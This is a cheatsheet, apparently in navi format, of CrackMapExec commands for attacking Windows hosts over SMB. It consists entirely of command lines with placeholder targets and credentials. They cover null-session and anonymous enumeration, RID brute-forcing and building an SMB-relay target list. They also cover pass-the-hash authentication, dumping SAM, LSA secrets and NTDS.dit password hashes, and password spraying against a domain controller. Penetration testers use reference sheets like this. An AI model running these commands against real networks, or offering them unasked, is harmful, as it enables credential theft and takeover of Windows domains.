# cme

% windows, smb, enumeration, cme, 445

## cme - enumerate hosts, network

Exemple : cme smb 192.168.1.0/24

```
cme smb <ip>
```

## cme - enumerate null session
```
cme smb <ip> -u '' -p '' --pass-pol
```

## cme - enumerate anonymous login
```
cme smb <ip> -u 'a' -p ''
```

## cme - enumerate active sessions
```
cme smb <ip> -u <user> -p '<password>' --sessions
```

## cme - enumerate logged users
```
cme smb <ip> -u <user> -p '<password>' --loggedon-users
```

## cme - enumerate domain users
```
cme smb <ip> -u <user> -p '<password>' --users
```

## cme - enumerate users by bruteforce the RID
```
cme smb <ip> -u <user> -p '<password>' --rid-brute
```

## cme - enumerate domain groups
```
cme smb <ip> -u <user> -p '<password>' --groups
```

## cme - enumerate local groups
```
cme smb <ip> -u <user> -p '<password>' --local-groups
```

## cme - enumerate host with smb signing not required
```
cme smb <ip> --gen-relay-list <relaylistOutputFilename>
```

## cme - local-auth
```
cme smb <ip> -u <user> -p <password> --local-auth
```

## cme - local-auth with hash
```
cme smb <ip> -u <user> -H <hash> --local-auth
```

## cme - domain
```
cme smb <ip> -u <user> -p <password> -d <domain>
```

## cme - SAM
```
cme smb <ip> -u <user> -p <password> -d <domain> --sam
```

## cme - LSA
```
cme smb <ip> -u <user> -p <password> -d <domaine> --lsa
```

## cme - shares
```
cme smb <ip> -u <user> -p <password> -d <domain> --shares
```

## cme - enumerate disks
```
cme smb <ip> -u <user> -p '<password>' --disks
```

## cme - ntds.dit
```
cme smb <ip> -u <user> -p <password> -d <domain> --ntds
```

## cme - ntds.dit history
```
cme smb <ip> -u <user> -p <password> -d <domain> --ntds-history
```

## crackmap exec - password spray (user=password)
```
cme smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce
```

## crackmap exec - password spray multiple test (carrefull on lockout)
```
cme smb <dc-ip> -u <user.txt> -p <password.txt>
```


= ip: 192.168.1.0/24
